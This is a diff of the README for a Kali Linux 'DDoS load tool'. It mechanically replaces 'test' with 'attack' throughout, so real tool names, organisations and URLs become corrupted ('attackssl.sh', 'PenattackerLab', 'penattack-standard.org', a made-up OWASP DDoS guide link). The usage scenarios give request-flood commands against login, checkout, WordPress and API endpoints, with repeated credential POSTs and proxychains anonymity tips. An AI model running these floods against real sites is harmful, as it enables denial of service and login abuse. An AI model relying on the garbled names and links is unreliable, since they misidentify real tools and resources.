+I, [Client Representative Name], [Title], hereby authorize [attacker Name]
+to perform penetration attacking activities on the systems listed above
 during the specified time period.
 
 Client Signature: _________________ Date: _________
-Tester Signature: _________________ Date: _________
+attacker Signature: _________________ Date: _________
 
 Emergency Contact: [Phone/Email]
 ```
@@ -1131,17 +1131,17 @@ Emergency Contact: [Phone/Email]
 
 1. **Always Get Written Authorization**
    ```bash
-   # Before running ANY test, verify you have authorization
+   # Before running ANY attack, verify you have authorization
    # Keep authorization documents in project folder
-   mkdir -p ~/pentest/client_name/authorization
+   mkdir -p ~/penattack/client_name/authorization
    ```
 
 2. **Document Everything**
    ```bash
    # Log all commands
-   script -a pentest_log_$(date +%Y%m%d).txt
+   script -a penattack_log_$(date +%Y%m%d).txt
    
-   # Run your tests
+   # Run your attacks
    python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache
    
    # Exit logging
@@ -1150,14 +1150,14 @@ Emergency Contact: [Phone/Email]
 
 3. **Stay Within Scope**
    ```bash
-   # Only test authorized targets
+   # Only attack authorized targets
    AUTHORIZED_TARGET="http://client-authorized-domain.com"
    python3 main-kali-linux.py "$AUTHORIZED_TARGET" -n 1000 -c 50 --no-cache
    ```
 
 4. **Respect Time Windows**
    ```bash
-   # Check current time before testing
+   # Check current time before attacking
    date
    
    # Only proceed if within authorized window
@@ -1173,26 +1173,26 @@ Emergency Contact: [Phone/Email]
 
 1. **Integrity**: Always act with honesty and integrity
 2. **Confidentiality**: Protect client information
-3. **Competence**: Only perform tests you're qualified for
+3. **Competence**: Only perform attacks you're qualified for
 4. **Legality**: Always operate within the law
 5. **Responsibility**: Take responsibility for your actions
 6. **Professionalism**: Maintain professional standards
 
 ### If You Discover a Vulnerability
 
-1. **Stop Testing** if you find critical vulnerability
+1. **Stop attacking** if you find critical vulnerability
 2. **Document** the finding with screenshots/logs
 3. **Notify Client** immediately through secure channel
 4. **Don't Exploit** beyond proof of concept
 5. **Provide Remediation** recommendations
-6. **Retest** after fixes are applied (if authorized)
+6. **Reattack** after fixes are applied (if authorized)
 
 ### Disclaimer
 
 By using this tool, you acknowledge that:
 
 - You have read and understood these legal considerations
-- You will only use this tool on systems you're authorized to test
+- You will only use this tool on systems you're authorized to attack
 - You accept full legal responsibility for your actions
 - The tool developers are not liable for any misuse
 - Unauthorized use may result in criminal prosecution
@@ -1239,7 +1239,7 @@ ping target.com
 # Check if target is reachable
 curl -I http://target.com
 
-# Test with minimal load first
+# attack with minimal load first
 python3 main-kali-linux.py http://target.com -n 10 -c 1
 ```
 
@@ -1283,7 +1283,7 @@ sudo update-ca-certificates
 # Check available memory
 free -h
 
-# Monitor memory during test
+# Monitor memory during attack
 watch -n 1 free -h
 
 # Reduce concurrency if low on memory
@@ -1293,7 +1293,7 @@ python3 main-kali-linux.py http://target.com -n 5000 -c 25
 #### 7. DNS Resolution Issues
 
 ```bash
-# Test DNS resolution
+# attack DNS resolution
 nslookup target.com
 
 # Use IP address directly
@@ -1361,8 +1361,8 @@ python3 -u main-kali-linux.py http://target.com -n 10 -c 2
 
 - [Kali Linux Official Docs](https://www.kali.org/docs/)
 - [Kali Tools Documentation](https://www.kali.org/tools/)
-- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-ddos-attack-guide/)
+- [Penetration attacking Execution Standard](http://www.penattack-standard.org/)
+- [OWASP attacking Guide](https://owasp.org/www-project-web-ddos-attack-guide/)
 
 ### Recommended Wordlists
 
@@ -1391,9 +1391,9 @@ wapiti -u http://target.com
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 dirb http://target.com
 
-# SSL/TLS testing
+# SSL/TLS attacking
 sslscan target.com
-testssl.sh target.com
+attackssl.sh target.com
 
 # Web application firewall detection
 wafw00f http://target.com
@@ -1403,7 +1403,7 @@ wafw00f http://target.com
 
 - [Hack The Box](https://www.hackthebox.eu/)
 - [TryHackMe](https://tryhackme.com/)
-- [PentesterLab](https://pentesterlab.com/)
+- [PenattackerLab](https://penattackerlab.com/)
 - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
 - [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
 
@@ -1420,47 +1420,47 @@ python3 main-kali-linux.py http://target.com -n 50 -c 5
 # Step 2: If responsive, increase load
 python3 main-kali-linux.py http://target.com -n 500 -c 25 --no-cache
 
-# Step 3: Test specific endpoints found
+# Step 3: attack specific endpoints found
 python3 main-kali-linux.py http://target.com/admin -n 200 -c 10 --no-cache
 ```
 
 ### Scenario 2: API Security Assessment
 
 ```bash
-# Test API authentication
+# attack API authentication
 python3 main-kali-linux.py http://target.com/api/v1/auth \
   -n 500 -c 25 -m POST \
-  --body '{"username":"test","password":"test"}' \
+  --body '{"username":"attack","password":"attack"}' \
   --no-cache
 
-# Test API rate limiting
+# attack API rate limiting
 python3 main-kali-linux.py http://target.com/api/v1/data \
   -n 2000 -c 100 \
   -H "Authorization: Bearer token123" \
   --no-cache
 
-# Test API without auth
+# attack API without auth
 python3 main-kali-linux.py http://target.com/api/v1/users \
   -n 1000 -c 50 --no-cache
 ```
 
-### Scenario 3: E-commerce Testing
+### Scenario 3: E-commerce attacking
 
 ```bash
-# Test product pages
+# attack product pages
 python3 main-kali-linux.py http://target.com/products \
   -n 2000 -c 100 --no-cache --random-ua
 
-# Test shopping cart
+# attack shopping cart
 python3 main-kali-linux.py http://target.com/cart \
   -n 1000 -c 50 \
-  -H "Cookie: session=test123" \
+  -H "Cookie: session=attack123" \
   --no-cache
 
-# Test checkout process
+# attack checkout process
 python3 main-kali-linux.py http://target.com/checkout \
   -n 500 -c 25 -m POST \
-  -H "Cookie: session=test123" \
+  -H "Cookie: session=attack123" \
   --body '{"payment":"card"}' \
   --no-cache
 ```
@@ -1468,24 +1468,24 @@ python3 main-kali-linux.py http://target.com/checkout \
 ### Scenario 4: WordPress Security
 
 ```bash
-# Test wp-login.php
+# attack wp-login.php
 python3 main-kali-linux.py http://target.com/wp-login.php \
   -n 500 -c 25 -m POST \
-  --body "log=admin&pwd=test" \
+  --body "log=admin&pwd=attack" \
   --no-cache
 
-# Test XML-RPC
+# attack XML-RPC
 python3 main-kali-linux.py http://target.com/xmlrpc.php \
   -n 500 -c 25 -m POST \
   -H "Content-Type: text/xml" \
   --no-cache
 
-# Test REST API
+# attack REST API
 python3 main-kali-linux.py http://target.com/wp-json/wp/v2/users \
   -n 1000 -c 50 --no-cache
 ```
 
-### Scenario 5: Mobile API Testing
+### Scenario 5: Mobile API attacking
 
 ```bash
 # Simulate mobile app traffic
@@ -1495,7 +1495,7 @@ python3 main-kali-linux.py http://target.com/api/mobile \
   -H "X-Device-ID: device123" \
   --no-cache
 
-# Test with mobile user agent
+# attack with mobile user agent
 python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" \
@@ -1509,7 +1509,7 @@ python3 main-kali-linux.py http://target.com \
 ### 1. Operational Security
 
 ```bash
-# Use VPN when testing
+# Use VPN when attacking
 sudo openvpn client.ovpn
 
 # Check your IP
@@ -1523,13 +1523,13 @@ proxychains python3 main-kali-linux.py http://target.com -n 100 -c 10
 
 ```bash
 # Always log your activities
-script -a pentest_$(date +%Y%m%d).log
+script -a penattack_$(date +%Y%m%d).log
 
 # Take screenshots
 scrot screenshot_$(date +%Y%m%d_%H%M%S).png
 
 # Record terminal session
-asciinema rec pentest_session.cast
+asciinema rec penattack_session.cast
 ```
 
 ### 3. Secure Communication
@@ -1575,7 +1575,7 @@ We welcome contributions from the security community:
 
 1. Fork the repository
 2. Create a feature branch
-3. Test thoroughly on Kali Linux
+3. attack thoroughly on Kali Linux
 4. Submit a pull request
 
 ### Reporting Security Issues
@@ -1615,7 +1615,7 @@ Unauthorized use is:
 - ❌ Harmful
 - ❌ Prosecutable
 
-**Always get written authorization before testing any system you don't own.**
+**Always get written authorization before attacking any system you don't own.**
 
 ---
 
@@ -1623,7 +1623,7 @@ Unauthorized use is:
 
 **Made with ❤️ by Team Supreme X**
 
-**Use Responsibly | Test Ethically | Stay Legal**
+**Use Responsibly | attack Ethically | Stay Legal**
 
 [⬆ Back to Top](#-ddos-load-tool---kali-linux-edition)
 
